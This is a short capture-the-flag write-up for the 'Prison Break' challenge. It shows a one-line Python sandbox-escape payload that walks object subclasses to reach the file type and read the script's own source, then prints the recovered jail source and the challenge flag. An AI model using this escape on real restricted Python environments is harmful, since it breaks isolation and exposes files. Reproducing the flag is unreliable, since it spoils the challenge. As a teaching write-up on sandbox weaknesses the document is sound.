## Prison Break
The main idea finding the flag is just escaping Python Sandbox.

#### Step-1:
After I ran `nc chall.csivit.com 30407`, we get this a python sandbox.

I tried various commands like flag and ctf and all, but nothing worked.

#### Step-2:
Thanks to organiser, they gave some hint: https://ctf-wiki.github.io/ctf-wiki/pwn//linux/sandbox/python-sandbox-escape/

#### Step-3:
There I got this 1 liner to escape the sandbox.

**Payload:**
```python
print(().__class__.__bases__[0].__subclasses__()[40](__file__).read())
```

I got the source code, which had the flag.

```python
#!/usr/bin/python

import sys

class Sandbox(object):
    def execute(self, code_string):
        exec(code_string)
        sys.stdout.flush()

sandbox = Sandbox()

_raw_input = raw_input

main = sys.modules["__main__"].__dict__
orig_builtins = main["__builtins__"].__dict__

builtins_whitelist = set((
    #exceptions
    'ArithmeticError', 'AssertionError', 'AttributeError', 'Exception',

    #constants
    'False', 'None', 'True',

    #types
    'basestring', 'bytearray', 'bytes', 'complex', 'dict',

    #functions
    'abs', 'bin', 'dir', 'help'

    # blocked: eval, execfile, exit, file, quit, reload, import, etc.
))

for builtin in orig_builtins.keys():
    if builtin not in builtins_whitelist:
        del orig_builtins[builtin]

print("Find the flag.")
sys.stdout.flush()

def flag_function():
    flag = "csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}"

while 1:
    try:
        sys.stdout.write(">>> ")
        sys.stdout.flush()
        code = _raw_input()
        sandbox.execute(code)

    except Exception:
        print("You have encountered an error.")
        sys.stdout.flush()
```

#### Step-4:
Finally the flag becomes:
`csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}`